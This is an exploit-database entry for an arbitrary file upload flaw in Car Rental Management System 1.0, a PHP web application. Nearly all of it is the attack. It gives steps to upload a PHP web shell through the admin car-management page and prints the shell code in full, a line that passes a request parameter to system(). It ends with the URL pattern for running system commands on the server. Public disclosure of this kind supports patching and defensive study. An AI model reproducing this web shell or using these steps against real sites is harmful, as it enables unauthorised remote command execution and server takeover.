---
title: "Car Rental Management System 1.0 - Arbitrary File Upload"
date: 2020-10-22T10:57:56-03:00
draft: false
type: "webapps"
platform: "php"
---

```html

#Vulnerable Page: http://localhost/carRental/admin/index.php?page=manage_car

#Exploit
	Fill details
	Create php shell code with below script
		<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
	Click on Browse
	Select php file
	Click Save
	Access below URL:
		http://localhost/carRental/admin/assets/uploads/cars_img/1603387740_backdoor.php?cmd=sysinfo
	add system commands after cmd to execute it.

```